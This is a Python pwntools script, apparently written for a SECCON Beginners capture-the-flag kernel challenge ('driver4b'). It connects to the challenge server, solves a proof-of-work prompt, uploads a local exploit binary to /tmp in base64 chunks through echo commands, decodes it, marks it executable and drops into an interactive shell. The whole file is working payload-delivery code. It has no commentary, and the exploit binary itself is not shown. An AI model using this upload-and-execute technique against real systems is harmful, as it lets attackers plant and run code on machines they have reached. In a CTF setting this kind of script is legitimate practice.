from pwn import *
import base64

with open("./a.out", "rb") as f:
    payload = base64.b64encode(f.read()).decode()

p = remote('driver4b.beginners.seccon.games', 9004)
cmd = p.recvline().decode().split()
q = process(cmd)
q.recvuntil(b': ')
p.sendline(q.recvline())

p.sendlineafter(b'$ ', b'cd /tmp')

for i in range(0, len(payload), 512):
    print(f"Uploading... {i:x} / {len(payload):x}")
    p.sendlineafter(b'$ ', 'echo -n "{}" >> b64exp'.format(payload[i:i+512]))

p.sendlineafter(b'$ ', b'base64 -d b64exp > exploit')
p.sendlineafter(b'$ ', b'chmod +x exploit')
p.interactive()
